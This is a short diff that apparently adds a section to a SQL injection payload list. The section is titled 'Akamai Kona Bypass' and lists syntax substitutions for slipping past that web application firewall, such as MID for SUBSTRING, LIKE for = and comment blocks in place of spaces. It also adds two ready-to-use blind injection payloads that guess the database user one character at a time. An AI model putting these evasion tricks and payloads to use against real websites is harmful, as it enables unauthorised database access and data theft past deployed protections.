@@ -63,9 +63,18 @@ Ordre and Union based palloads
 -
 
 
+Akamai Kona Bypass
+
+MID instead of SUBSTRING
+LIKE instead of =
+/**/ instead of a space
+CURRENT_USER instead of CURRENT_USER()
+" instead of '
 
 
-
+       444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
+       
+       OR/**/3409LIKE3409/**/AND/**/("pytW"/**/LIKE/**/"pytW
 
 
 
